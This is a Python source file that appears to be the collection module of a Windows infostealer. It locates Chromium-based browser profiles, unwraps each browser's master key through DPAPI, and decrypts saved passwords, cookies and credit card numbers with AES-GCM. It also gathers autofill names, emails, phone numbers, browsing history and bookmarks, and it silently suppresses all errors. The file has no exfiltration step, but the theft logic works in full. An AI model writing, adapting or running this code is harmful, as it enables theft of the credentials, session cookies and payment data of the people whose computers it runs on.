import os
import json
import base64
import shutil
import sqlite3
import tempfile
import re

try:
    import win32crypt
except:
    win32crypt = None

try:
    from Crypto.Cipher import AES
except:
    AES = None

LOCAL = os.getenv("LOCALAPPDATA") or ""
ROAMING = os.getenv("APPDATA") or ""

BROWSERS = {
    'Chrome': os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    'Edge': os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
    'Brave': os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    'Opera': os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    'OperaGX': os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
    'Vivaldi': os.path.join(LOCAL, "Vivaldi", "User Data"),
    'Yandex': os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
    'Chromium': os.path.join(LOCAL, "Chromium", "User Data"),
}

def _get_master_key(browser_path):
    try:
        local_state = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state):
            return None
        with open(local_state, "r", encoding="utf-8", errors="ignore") as f:
            data = json.load(f)
        enc_key = data.get("os_crypt", {}).get("encrypted_key")
        if not enc_key:
            return None
        key = base64.b64decode(enc_key)[5:]
        if win32crypt is None:
            return None
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def _decrypt_value(encrypted_value, master_key):
    try:
        if not encrypted_value:
            return ""
        if encrypted_value[:3] in [b'v10', b'v11']:
            if master_key is None or AES is None:
                return ""
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt(ciphertext)
            try:
                return decrypted.decode('utf-8', errors='ignore')
            except:
                return decrypted.decode(errors='ignore')
        else:
            if win32crypt is None:
                return ""
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        try:
            if win32crypt:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            pass
        return ""

def _get_profiles(browser_path):
    profiles = []
    try:
        if not os.path.exists(browser_path):
            return profiles
        if os.path.exists(os.path.join(browser_path, "Login Data")) or os.path.exists(os.path.join(browser_path, "Default", "Login Data")):
            if os.path.exists(os.path.join(browser_path, "Login Data")):
                profiles.append(browser_path)
            for item in os.listdir(browser_path):
                full = os.path.join(browser_path, item)
                if os.path.isdir(full) and (item == "Default" or item.startswith("Profile ")):
                    profiles.append(full)
            if not profiles and os.path.exists(os.path.join(browser_path, "Default")):
                profiles.append(os.path.join(browser_path, "Default"))
        else:
            for item in os.listdir(browser_path):
                full = os.path.join(browser_path, item)
                if os.path.isdir(full) and (item == "Default" or item.startswith("Profile ")):
                    profiles.append(full)
    except:
        pass
    return profiles

def _copy_db(db_path):
    try:
        if not os.path.exists(db_path):
            return None
        tmp = os.path.join(tempfile.gettempdir(), f"temp_db_{os.getpid()}_{hash(db_path) & 0xffff}.db")
        shutil.copy2(db_path, tmp)
        return tmp
    except:
        return None

def get_passwords():
    results = []
    for name, path in BROWSERS.items():
        try:
            if not os.path.exists(path):
                continue
            master_key = _get_master_key(path)
            profiles = _get_profiles(path)
            if not profiles:
                continue
            for profile in profiles:
                db_path = os.path.join(profile, "Login Data")
                if not os.path.exists(db_path):
                    continue
                tmp_db = _copy_db(db_path)
                if not tmp_db:
                    continue
                try:
                    conn = sqlite3.connect(tmp_db)
                    conn.text_factory = bytes
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for origin_url, username, password_value in cursor.fetchall():
                        try:
                            if isinstance(origin_url, bytes):
                                origin_url = origin_url.decode('utf-8', errors='ignore')
                            if isinstance(username, bytes):
                                username = username.decode('utf-8', errors='ignore')
                            decrypted = _decrypt_value(password_value, master_key)
                            if username or decrypted:
                                if decrypted and decrypted.strip():
                                    results.append({
                                        'browser': name,
                                        'profile': os.path.basename(profile),
                                        'url': origin_url,
                                        'username': username,
                                        'password': decrypted
                                    })
                        except:
                            continue
                    conn.close()
                except:
                    pass
                try:
                    os.remove(tmp_db)
                except:
                    pass
        except:
            continue
    return results

def get_cookies():
    results = []
    for name, path in BROWSERS.items():
        try:
            if not os.path.exists(path):
                continue
            master_key = _get_master_key(path)
            profiles = _get_profiles(path)
            for profile in profiles:
                for cookie_file in [os.path.join(profile, "Cookies"), os.path.join(profile, "Network", "Cookies")]:
                    if not os.path.exists(cookie_file):
                        continue
                    tmp_db = _copy_db(cookie_file)
                    if not tmp_db:
                        continue
                    try:
                        conn = sqlite3.connect(tmp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
                        for host_key, cname, enc_value, cpath, expires in cursor.fetchall():
                            try:
                                if isinstance(host_key, bytes):
                                    host_key = host_key.decode('utf-8', errors='ignore')
                                if isinstance(cname, bytes):
                                    cname = cname.decode('utf-8', errors='ignore')
                                decrypted = _decrypt_value(enc_value, master_key) if isinstance(enc_value, bytes) else str(enc_value)
                                if decrypted:
                                    results.append({
                                        'browser': name,
                                        'host': host_key,
                                        'name': cname,
                                        'value': decrypted,
                                        'path': cpath,
                                        'expires': expires
                                    })
                            except:
                                continue
                        conn.close()
                    except:
                        pass
                    try:
                        os.remove(tmp_db)
                    except:
                        pass
        except:
            continue
    return results

def get_history(limit=200):
    results = []
    for name, path in BROWSERS.items():
        try:
            if not os.path.exists(path):
                continue
            profiles = _get_profiles(path)
            for profile in profiles:
                db_path = os.path.join(profile, "History")
                if not os.path.exists(db_path):
                    continue
                tmp_db = _copy_db(db_path)
                if not tmp_db:
                    continue
                try:
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
                    for url, title, visit_count, last_visit in cursor.fetchall():
                        try:
                            if isinstance(url, bytes):
                                url = url.decode('utf-8', errors='ignore')
                            if isinstance(title, bytes):
                                title = title.decode('utf-8', errors='ignore')
                            results.append({
                                'browser': name,
                                'url': url,
                                'title': title,
                                'visits': visit_count
                            })
                        except:
                            continue
                    conn.close()
                except:
                    pass
                try:
                    os.remove(tmp_db)
                except:
                    pass
        except:
            continue
    return results[:limit]

def get_autofill():
    results = []
    for name, path in BROWSERS.items():
        try:
            if not os.path.exists(path):
                continue
            profiles = _get_profiles(path)
            for profile in profiles:
                db_path = os.path.join(profile, "Web Data")
                if not os.path.exists(db_path):
                    continue
                tmp_db = _copy_db(db_path)
                if not tmp_db:
                    continue
                try:
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT first_name, middle_name, last_name, full_name, email FROM autofill_profiles")
                        for r in cursor.fetchall():
                            try:
                                vals = [v.decode('utf-8', errors='ignore') if isinstance(v, bytes) else str(v) for v in r]
                                if any(v.strip() for v in vals):
                                    results.append({'browser': name, 'type': 'profile', 'data': " | ".join(vals)})
                            except:
                                continue
                    except:
                        pass
                    try:
                        cursor.execute("SELECT email FROM autofill_profile_emails")
                        for (email,) in cursor.fetchall():
                            if isinstance(email, bytes):
                                email = email.decode('utf-8', errors='ignore')
                            if email.strip():
                                results.append({'browser': name, 'type': 'email', 'data': email})
                    except:
                        pass
                    try:
                        cursor.execute("SELECT number FROM autofill_profile_phones")
                        for (num,) in cursor.fetchall():
                            if isinstance(num, bytes):
                                num = num.decode('utf-8', errors='ignore')
                            if num.strip():
                                results.append({'browser': name, 'type': 'phone', 'data': num})
                    except:
                        pass
                    conn.close()
                except:
                    pass
                try:
                    os.remove(tmp_db)
                except:
                    pass
        except:
            continue
    return results

def get_credit_cards():
    results = []
    for name, path in BROWSERS.items():
        try:
            if not os.path.exists(path):
                continue
            master_key = _get_master_key(path)
            profiles = _get_profiles(path)
            for profile in profiles:
                db_path = os.path.join(profile, "Web Data")
                if not os.path.exists(db_path):
                    continue
                tmp_db = _copy_db(db_path)
                if not tmp_db:
                    continue
                try:
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards")
                        for cname, exp_m, exp_y, enc_num, _ in cursor.fetchall():
                            try:
                                if isinstance(cname, bytes):
                                    cname = cname.decode('utf-8', errors='ignore')
                                decrypted = _decrypt_value(enc_num, master_key) if isinstance(enc_num, bytes) else str(enc_num)
                                results.append({
                                    'browser': name,
                                    'name': cname,
                                    'exp_month': exp_m,
                                    'exp_year': exp_y,
                                    'number': decrypted
                                })
                            except:
                                continue
                    except:
                        pass
                    conn.close()
                except:
                    pass
                try:
                    os.remove(tmp_db)
                except:
                    pass
        except:
            continue
    return results

def get_bookmarks(limit=200):
    results = []
    for name, path in BROWSERS.items():
        try:
            if not os.path.exists(path):
                continue
            profiles = _get_profiles(path)
            for profile in profiles:
                bm_path = os.path.join(profile, "Bookmarks")
                if not os.path.exists(bm_path):
                    continue
                try:
                    with open(bm_path, 'r', encoding='utf-8', errors='ignore') as f:
                        data = json.load(f)
                    def parse_node(node):
                        try:
                            if node.get('type') == 'url':
                                results.append({'browser': name, 'name': node.get('name'), 'url': node.get('url')})
                            elif 'children' in node:
                                for child in node['children']:
                                    parse_node(child)
                                    if len(results) >= limit:
                                        return
                        except:
                            pass
                    roots = data.get('roots', {})
                    for root in roots.values():
                        parse_node(root)
                        if len(results) >= limit:
                            break
                except:
                    continue
        except:
            continue
    return results[:limit]
